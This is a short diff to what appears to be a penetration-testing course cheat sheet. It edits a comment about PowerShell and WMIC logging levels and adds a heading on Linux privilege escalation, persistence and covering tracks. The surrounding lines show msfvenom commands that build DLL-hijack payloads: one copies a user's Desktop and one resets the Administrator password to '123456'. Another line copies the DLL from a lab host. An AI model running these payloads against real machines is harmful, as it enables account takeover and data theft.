@@ -3503,7 +3503,7 @@ powershell -command "$psversiontable"
 Determine if logging is set (PowerShell and WMIC)
 reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell
 reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
-# 0 = no | 1 = errors | 2 = verbose
+0 = no | 1 = errors | 2 = verbose
 
 
 WMIC Log Storage
@@ -3550,6 +3550,10 @@ msfvenom -p windows/exec CMD='cmd.exe /C "xcopy C:\Users\Admin\Desktop C:\Users\
 msfvenom -p windows/exec CMD='cmd.exe /C "net user Administrator 123456"' -f dll > hijackmeplz.dll
 
 scp student@10.50.38.176:/home/student/hijackmeplz.dll “C:\Path to executable\hijackmeplz.dll”
+
+
+
+# Linux Privilege Escalation, Persistence, and Covering your tracks
 
 
 
